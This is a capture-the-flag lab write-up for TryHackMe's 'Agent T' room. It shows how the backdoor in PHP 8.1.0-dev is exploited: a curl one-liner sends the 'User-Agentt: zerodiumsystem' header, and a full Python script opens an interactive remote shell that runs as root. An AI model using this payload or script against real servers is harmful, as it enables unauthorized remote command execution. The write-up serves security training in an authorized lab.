🕵️ TryHackMe - Agent T
Room: Agent T
Platform: TryHackMe
Difficulty: Easy
Category: Web - PHP Backdoor - RCE - Root

TryHackMe
Difficulty
OS
Status

📖 Overview
Something seems a little off with the server.

Agent T is a lightweight, fun room that proves one rule:

Never run a dev version on production.

The server runs PHP 8.1.0-dev - a version that was released with a backdoor on March 28th 2021 and quickly removed. If this version is running, you get RCE with one header, and you are already root.

No brute force, no upload, no PrivEsc needed. One exploit = Root.

🛠️ Tools Used
Tool	Usage
nmap	Port scanning
curl / Burp Suite	Check HTTP headers - PHP version leak
Exploit-DB 49933	PHP 8.1.0-dev Backdoor RCE
python3	Run the exploit
🔍 Walkthrough
1. Enumeration - Nmap
nmap -sC -sV <TARGET_IP>
Result:

PORT   STATE SERVICE VERSION
80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title: Admin Dashboard
Only port 80 open. Site is Admin Dashboard - looks useless, buttons don't go anywhere.

2. Find PHP Version - Headers
Check headers with curl or Burp:

curl -I http://<TARGET_IP>
You will see:

X-Powered-By: PHP/8.1.0-dev
That's the vulnerability. PHP 8.1.0-dev has a backdoor.

3. Exploitation - PHP 8.1.0-dev Backdoor RCE
Exploit-DB: https://www.exploit-db.com/exploits/49933

How it works: If you send a header called User-Agentt (with double t) containing zerodiumsystem('command');, the backdoored PHP executes it.

Manual test:

curl -H 'User-Agentt: zerodiumsystem("id");' http://<TARGET_IP>
Better: Use the Python exploit by flast101:

nano php-8.1.0-exploit.py
#!/usr/bin/env python3
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host)
    while 1:
        cmd = input("$ ")
        headers = {
            "User-Agent": "Mozilla/5.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
        }
        response = request.get(host, headers=headers, allow_redirects=False)
        current_page = response.text
        stdout = current_page.split('<!DOCTYPE html>',1)
        print(stdout[0])
Run it:

python3 php-8.1.0-exploit.py
# Enter the full host url: http://<TARGET_IP>
4. You Are Already Root
$ whoami
root

$ id
uid=0(root) gid=0(root)
No PrivEsc needed. The PHP CLI server runs as root.

5. Get The Flag
$ find / -type f -name "*.txt" 2>/dev/null
$ cat /flag.txt
Flag:

Thank You.
In TryHackMe, the question is: What is the flag?
Answer is the content of /flag.txt

🚩 Flags / Answers
Question	Answer / Location
PHP Version	PHP/8.1.0-dev
Exploit	Exploit-DB 49933 - User-Agentt RCE
User	root - Direct
Flag	/flag.txt
🐛 Common Errors & Fixes
Error	Cause	Fix
Exploit says Host is not available	Wrong URL format	Use http://<TARGET_IP>/ with / at end
User-Agentt not working	Single t typo	Must be User-Agentt with 2 t
Exploit-DB script doesn't allow cd	Old script is limited	Use flast101 version or use full paths cat /flag.txt
Nmap shows no version	Need -sV	nmap -sC -sV <TARGET_IP>
🧠 Key Learnings
Check Headers Always - X-Powered-By leaked the exact vulnerable version.
Dev Version = Backdoor - PHP 8.1.0-dev was compromised for a short time in 2021, but if you run it, you are pwned.
Backdoor vs Vulnerability - This is not a bug, it's a planted backdoor: User-Agentt header = RCE.
Running as Root is Dangerous - PHP CLI server running as root = instant root shell, no PrivEsc chain needed.
One Port is Enough - Even with only port 80 open, one vulnerable service is enough to root the box.
🔗 References
Room: https://tryhackme.com/room/agentt
Exploit-DB 49933: https://www.exploit-db.com/exploits/49933
PHP Backdoor: https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
Flast101 Exploit: https://github.com/flast101/php-8.1.0-dev-backdoor-rce
👨‍💻 Author
Ahmed Ashraf

TryHackMe Labs & CTF Writeups
Focus: Penetration Testing / Web Exploitation / Linux PrivEsc
This writeup is for educational purposes only in an authorized lab environment. Do not use these techniques on systems you don't own or don't have permission to test.

